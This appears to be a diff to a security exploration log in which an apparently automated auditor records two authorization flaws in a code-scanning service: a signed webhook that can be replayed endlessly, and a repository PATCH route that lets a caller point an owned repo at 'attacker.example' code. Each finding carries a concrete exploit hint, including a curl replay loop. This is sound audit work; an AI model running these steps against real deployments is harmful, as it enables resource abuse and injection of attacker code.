@@ -661,3 +661,29 @@ notes (pass 14):
 - all prior STANDING rows (pass-1..pass-13) unmodified by this session's diff; the Phase-4 plumbing did not move any IO sink, only added the project_id path component and the JSON-decode point above.
 
 ----- end session expl-demo (pass 14) -----
+
+---
+phase23.exploration.v1 task=expl-demo (continuation)
+survey-only re-pass against HEAD (project-scoped repo routes + new webhook flow). New findings only; prior 4 still valid.
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyx-agent-api/src/webhook.rs",
+  "line": 176,
+  "cap": "AUTH_BYPASS",
+  "endpoint": "POST /webhook/git",
+  "rationale": "verify_signature checks HMAC-SHA256(body) but the payload carries no nonce, no timestamp, and no delivery-id, and the handler keeps no replay cache. A captured `X-Hub-Signature-256` header + body remains valid forever. An attacker who observes one delivery (TLS-terminating proxy log, mirrored npm log, a git server's outbound retry buffer, a contractor's HAR file) can re-POST it indefinitely to spawn unlimited scans — each call goes through `trigger.trigger(...)` (webhook.rs:215) which dispatches a full scan_pipeline run, so this is also a resource-amplification primitive (one stolen 200-byte payload → arbitrary number of repo clones + AI calls). GitHub mitigates this with `X-GitHub-Delivery` + server-side de-dup; nyx imports neither. Missed by static pass because the bug is a *missing* check, not a tainted sink.",
+  "suggested_payload_hint": "Capture one legitimate delivery's `X-Hub-Signature-256` + raw body, then `curl -X POST $DAEMON/webhook/git -H 'X-Hub-Signature-256: <captured>' --data-binary @body.json` in a loop — every call returns 202 with a fresh run_id."
+}
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyx-agent-api/src/router.rs",
+  "line": 816,
+  "cap": "AUTH_BYPASS",
+  "endpoint": "PATCH /api/v1/projects/:project_id/repos/:name",
+  "rationale": "create_project_repo (router.rs:737) demands `i_own_this:true` on every create. patch_project_repo only refuses `i_own_this:false` explicitly (router.rs:838) and otherwise leaves the prior attestation in place while letting the caller swap `source_kind` *and* `source_url_or_path` to anything in {git, github, gitlab, local-path, local}. Net result: an authenticated caller (or anyone holding a leaked bearer; combine with the URL-query-token logging issue at router.rs:132) can take a repo the operator owns, point it at attacker-controlled git over HTTPS, and the next scheduled scan ingests attacker code into the sandboxed scan_pipeline — including any subsequent `replay_repro_bundle` flows. The ownership attestation is a single bit attached to the row name; it's never re-bound to the (kind, url) tuple. State-machine flaw: the invariant `i_own_this ⇒ operator vetted the *current* source` decays the moment PATCH fires. Static pass missed because no flow is tainted — the bug is the absence of re-attestation on source mutation.",
+  "suggested_payload_hint": "with a valid bearer: PATCH /api/v1/projects/default/repos/<existing>, body {\"source_kind\":\"git\",\"source_url_or_path\":\"https://attacker.example/payload.git\"} — 200 OK, then wait for the next scan trigger or call POST /api/v1/projects/default/scan?repo=<existing>."
+}
